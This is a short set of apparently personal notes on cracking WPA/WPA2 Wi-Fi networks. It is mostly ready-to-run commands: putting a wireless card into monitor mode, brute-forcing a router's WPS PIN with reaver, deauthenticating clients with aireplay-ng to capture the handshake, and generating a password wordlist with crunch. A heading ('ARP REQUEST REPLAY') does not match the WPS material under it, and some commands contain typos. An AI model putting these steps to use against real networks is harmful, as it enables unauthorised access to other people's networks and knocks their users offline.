WIfi hacking WPA/WPA2

WPA/WPA2 CRACKING
• Both can be cracked using the same methods
• Made to address the issues in WEP.
• Much more secure.
• Each packet is encrypted using a unique temporary key.
→ Packets contain no useful information.

ARP REQUEST REPLAY
• WPS is a feature that can be used with WPA & WPA2.
• Allows clients to connect without the password.
• Authentication is done using an 8 digit pin.
    → 8 Digits is very small.
    → We can try all possible pins in relatively short time.
    → Then the WPS pin can be used to compute the actual password.
    
PS: This only works if the router is configured not to use PBC (Push        Button Authentication).

//Managed || Monitor mode (Promicious mode OR shealth mode)
**CMD
iwconfig (Check interface mode)
ifconfig wlan0 down
airmon-ng check kill
iwconnfig wlan0 mode monitor
ifconfig wlan0 up
iwconfig (check interface mode)

//Check that router is enable WPS
wash --interface wlan0mon(Interface name)

    → LCK = No (Target is using WPS)
    → LCK = yes (Target WPS is locked)

aireplay-ng --fakeauth 30 -a {AP Mac} -h {OWN wireless Mac address} wlan0mon 
reaver --bssid {AP Mac} --channel 1 --interface wlan0 -vvv --no-associate
 NOTE:- run both cmd different terminal at same time

//Capture Handshake
airodump-ng --bssid {AP Mac} --channel 1 --write filename wlan0mon
aireplay-ng --deauth 4 -a {AP mac} -c {connect mac} wlan0mon 

//Create Wordlist Using Crunch 
Crunch [Min] [max] [characters] -t [pattern] -o [fileame]
crunch 6 8 123abc$ -t a@@@@b -o Wordlist 

example :- aaaaab, a123bb, etc.
